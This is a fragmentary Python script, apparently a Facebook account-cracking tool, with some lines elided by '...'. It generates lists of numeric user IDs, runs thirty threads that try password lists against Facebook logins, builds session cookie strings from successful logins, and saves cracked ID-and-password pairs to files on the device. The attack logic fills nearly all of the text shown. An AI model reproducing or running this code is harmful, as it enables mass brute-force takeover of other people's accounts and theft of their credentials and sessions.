...
def menu():
		...
		#	os.system('xdg-open https://chat.whatsapp.com/Cntlb8VXTIi6Hntmk7sODi')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/SABBIR.txt  etc..')
				linex()
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as SABBIR:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					SABBIR.submit(SABBIR1,ids,passlist)
				if mthd in ['2','02']:
					SABBIR.submit(SABBIR2,ids,passlist)
				if mthd in ['3','03']:
					SABBIR.submit(SABBIR3,ids,passlist)
				if mthd in ['4','04']:
					SABBIR.submit(SABBIR4,ids,passlist)
				if mthd in ['5','05']:
					SABBIR.submit(SABBIR5,ids,passlist)
				if mthd in ['6','06']:
					SABBIR.submit(SABBIR6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/SABBIR-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SABBIR-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
